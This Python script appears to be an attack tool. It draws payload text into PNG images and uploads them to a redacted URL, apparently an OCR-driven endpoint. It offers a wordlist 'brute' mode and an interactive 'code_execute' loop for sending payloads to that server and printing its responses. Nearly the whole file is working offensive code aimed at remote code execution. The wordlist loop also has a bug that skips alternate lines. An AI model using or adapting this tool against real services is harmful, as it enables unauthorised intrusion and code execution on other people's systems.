import os
from PIL import Image
from PIL import ImageDraw
from PIL import ImageFont
import sys
import requests

underline="\u001b[4m"
bold="\u001b[1m"
r="\u001b[0m"
red="\u001b[31m"
green="\u001b[32m"
blue="\u001b[34m"

url="<REDACTED>"

def getSize(txt, font):
    testImg = Image.new('RGB', (1, 1))
    testDraw = ImageDraw.Draw(testImg)
    return testDraw.textsize(txt, font)

def createimg(text):
    fontname = "ins.tff"
    fontsize = 60
    colorText = "red"
    colorBackground = "white"
    font = ImageFont.truetype(fontname, fontsize)
    width, height = getSize(text, font)
    img = Image.new('RGB', (width+30, height+50), colorBackground)
    d = ImageDraw.Draw(img)
    d.text((0, height/2), text, fill=colorText, font=font)
    os.system("rm image.png")
    img.save("image.png")

def brute(wordlist):
    f = open(wordlist, "rb")
    count=1
    if "y" == input("Do u wanna colored print(y/n):"):
        colored=True
    else:
        colored=False

    for i in f:
        text=f.readline().decode()
        createimg(text)
        files= {'file': ("foo.png",open('image.png', 'rb'),'image/png') }
        a = requests.post(url, files=files)   
        if colored:
            if a.text[0:2] == "<p":
                response=a.text[3:-6]
                print(f"{underline}{green}Payload:{r}\n{text}{underline}{blue}Response:{r}\n{response}\n")
            else:
                print(f"{underline}{red}Response contains Error for payload:{r}\n{red}{text}{r}")
        else:
            if a.text[0:2] == "<p":
                response=a.text[3:-6]
                print(f"Response for payload {count}:\n{response}\n")
            else:
                print(f"Response contains Error for payload {count}...")
        count+=1

def exec(payload):
    createimg(payload)
    files= {'file': ("foo.png",open('image.png', 'rb'),'image/png') }
    a = requests.post(url, files=files)
    print(a.text+"\n")


try:
    #if debug_mode is on you can do dic attack with verbose
    if sys.argv[1] == "debug_mode":
        debug_mode=True

    #if its not, directly trying execute payload
    else:
        debug_mode=False

except:
    print("Usage:\npython3 script.py payload\npython3 script.py debug_mode")
    exit()


if __name__ == '__main__':
    if debug_mode:
        if "1" == input("Brute[1] or code_execute[2]:"):
            brute(input("File name:"))
        else:
            while True:
                exec(input("Payload:"))
    else:
        exec(sys.argv[1])